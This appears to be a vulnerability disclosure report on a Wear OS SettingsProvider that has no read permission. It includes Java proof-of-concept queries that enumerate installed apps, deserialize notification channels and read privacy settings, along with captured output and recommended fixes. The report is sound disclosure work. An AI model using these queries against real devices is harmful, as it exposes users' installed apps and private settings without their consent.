# VRP Report #45: Wearable SettingsProvider Missing readPermission — Zero-Permission App Enumeration, Notification Channel Disclosure & Settings Leak

## Vulnerability Summary
The Wear OS SettingsProvider (`com.google.android.apps.wearable.settings`) runs as UID 1000 (system) and exports a ContentProvider with `android:writePermission="com.google.android.wearable.WRITE_SETTINGS"` but **no `android:readPermission`**. Combined with `Binder.clearCallingIdentity()` in the query path, any app on the device can:
1. **Enumerate installed apps** by querying notification channels (bypasses Android 11+ package visibility)
2. **Read full notification channel details** — channel IDs, names, importance levels, groups, sound URIs
3. **Read system settings** (bluetooth mode, play store availability)

Additionally, the GMS GoogleSettingsProvider (`content://com.google.settings/partner`) is accessible without any permission, leaking user privacy preferences and backup configuration.

All without any permission — zero-permission app, UID 10156.

## Affected Components
### Primary: Wearable SettingsProvider
- **Package**: `com.google.android.apps.wearable.settings`
- **APK**: `/system_ext/priv-app/PixelWatchSettingsCompose/PixelWatchSettingsCompose.apk`
- **Provider Authority**: `com.google.android.wearable.settings`
- **UID**: 1000 (system, `android:sharedUserId="android.uid.system"`)
- **Device**: Pixel Watch 2 (eos, CP2A.260603.001, June 2026 patches)

### Secondary: GoogleSettingsProvider
- **Package**: `com.google.android.gms`
- **Provider Authority**: `com.google.settings`
- **URI**: `content://com.google.settings/partner`

## Root Cause
### Wearable SettingsProvider
In `AndroidManifest.xml`:
```xml
<provider android:authorities="com.google.android.wearable.settings"
    android:exported="true"
    android:name="com.google.android.clockwork.settings.provider.SettingsProvider"
    android:process="system"
    android:writePermission="com.google.android.wearable.WRITE_SETTINGS"/>
```

The provider declares `writePermission` (signature|privileged) but omits `readPermission`. Android's ContentProvider framework allows reads without any permission when `readPermission` is not set.

Additionally, `ChannelsProperties.query()` calls `Binder.clearCallingIdentity()` before querying notification channels via `NotificationManager`, executing the query with system UID privileges — this bypasses the calling app's package visibility restrictions entirely.

## Attack Chain

### 1. App Enumeration (Package Visibility Bypass)
```java
Bundle extras = new Bundle();
extras.putString("channel_q_package", targetPackage);
Cursor c = cr.query(Uri.parse("content://com.google.android.wearable.settings/notification_channels"),
    null, extras, null);
// c.getCount() > 0 → app is installed; 0 → not installed
```

### 2. Full Notification Channel Data Extraction
The cursor returns serialized `NotificationChannel` Parcel blobs. Deserializing them reveals:
```java
Parcel parcel = Parcel.obtain();
parcel.unmarshall(blob, 0, blob.length);
parcel.setDataPosition(0);
NotificationChannel nc = NotificationChannel.CREATOR.createFromParcel(parcel);
// nc.getId(), nc.getName(), nc.getImportance(), nc.getGroup(), nc.getSound()
```

### 3. System Settings Read
```java
Cursor c = cr.query(Uri.parse("content://com.google.android.wearable.settings/bluetooth"), null, null, null, null);
// Returns: bluetooth_mode (paired device OS type)
```

### 4. Google Settings Privacy Data
```java
Cursor c = cr.query(Uri.parse("content://com.google.settings/partner"), null, null, null, null);
// Returns: network_location_opt_in, use_location_for_services, backup config
```

## Dynamic Proof
Enhanced PoC running as **UID 10156** (zero-permission app), verified on 2026-09-10:

### Google Settings Leak (zero-permission read)
```
GSETTINGS: client_id = android-google
GSETTINGS: user_full_data_backup_aware = 1
GSETTINGS: backup_enabled:com.android.calllogbackup = 1
GSETTINGS: backup_encryption_opt_in_displayed = 1
GSETTINGS: network_location_opt_in = 0
GSETTINGS: use_location_for_services = 1
```

### App Enumeration Results (15/26 apps fingerprinted)
```
INSTALLED: com.google.android.apps.messaging (3 channels)
INSTALLED: com.google.android.dialer (2 channels)
INSTALLED: com.google.android.calendar (2 channels)
INSTALLED: com.google.android.keep (3 channels)
INSTALLED: com.google.android.apps.maps (6 channels)
INSTALLED: com.google.android.apps.safetyhub (2 channels)
INSTALLED: com.google.android.wearable.assistant (3 channels)
INSTALLED: com.google.android.apps.walletnfcrel (3 channels)
INSTALLED: com.whatsapp (3 channels)
INSTALLED: com.google.android.gms (13 channels)
INSTALLED: com.google.wear.services (2 channels)
INSTALLED: com.android.vending (16 channels)
INSTALLED: com.google.android.apps.wearable.settings (1 channels)
INSTALLED: com.fitbit.FitbitMobile (7 channels)
INSTALLED: com.google.android.apps.scone (1 channels)
NOT INSTALLED: com.google.android.gm
NOT INSTALLED: com.chase.sig.android
NOT INSTALLED: com.paypal.android.p2pmobile
NOT INSTALLED: org.thoughtcrime.securesms
NOT INSTALLED: com.tinder
```

### Deserialized Notification Channel Details (sample)
```
Messages: id=bugle_default_channel name=Incoming messages importance=4 group=_bugle_default_settings_group
WhatsApp: id=messagingChannel name=Messaging notifications importance=3
GMS:      id=find_my_device name=Location viewed importance=4 group=finder
GMS:      id=qrl_channel name=Remote Lock importance=4 group=finder
GMS:      id=eew_alert_v2 name=Earthquake early warning alert importance=4
Wallet:   id=tapandpay.transactions.low name=Transactions importance=4
Fitbit:   id=HR_Alert_Channel_ID name=Heart Rate Alert importance=5
Play:     id=play-protect name=Play Protect importance=4
Dialer:   id=missed_call name=Missed calls importance=4
```

## Impact
- **Confidentiality**: HIGH
  - **Package visibility bypass**: Android 11+ explicitly restricts apps from seeing other installed apps. This bypasses that protection entirely via the system UID.
  - **App fingerprinting**: Attacker determines which sensitive apps are installed (banking, health, dating, messaging)
  - **Deep notification channel disclosure**: Full notification channel metadata including names, IDs, importance levels, group assignments, and sound URIs reveal:
    - User has heart rate alerts configured (Fitbit HR_Alert_Channel_ID, importance=5)
    - User has earthquake alerts (GMS eew_alert_v2)
    - User has Find My Device location tracking (GMS find_my_device)
    - User has Remote Lock enabled (GMS qrl_channel)
    - User has WhatsApp messaging configured
    - User's notification importance preferences per-app
  - **Privacy preferences**: `network_location_opt_in=0` and `use_location_for_services=1` reveal location privacy choices
  - **Backup configuration**: Reveals backup state and encryption status
- **Integrity**: NONE — writes properly protected by signature|privileged permission
- **Availability**: NONE

## Privacy Impact
A malicious zero-permission app can build a comprehensive user profile by:
1. Probing hundreds of package names to fingerprint which apps are installed
2. Deserializing notification channel data to understand app usage patterns and configurations
3. Determining if sensitive features like heart rate monitoring, earthquake alerts, or remote device tracking are active
4. Reading user privacy choices (location opt-in, backup settings)
5. Combining bluetooth_mode to determine if the Watch is paired with Android or iOS

## Recommended Fix
1. Add `android:readPermission` to the Wearable SettingsProvider:
```xml
<provider android:authorities="com.google.android.wearable.settings"
    android:exported="true"
    android:readPermission="com.google.android.wearable.READ_SETTINGS"
    android:writePermission="com.google.android.wearable.WRITE_SETTINGS"
    android:process="system"
    android:name="com.google.android.clockwork.settings.provider.SettingsProvider"/>
```

2. Remove `Binder.clearCallingIdentity()` from `ChannelsProperties.query()` or add explicit caller permission checks before querying notification channels.

3. Add readPermission to GoogleSettingsProvider or restrict the partner table.

## PoC Files
- `poc_app/src/com/vrp/poc/WearSettingsLeakActivity.java` (original)
- `poc_app/src/com/vrp/poc/WearSettingsLeakV2Activity.java` (enhanced — channel deserialization + Google settings)
- `dynamic_evidence/wearable_settings_leak.log` (original evidence)
- `dynamic_evidence/wearable_settings_leak_v2.log` (enhanced evidence — 214 lines)
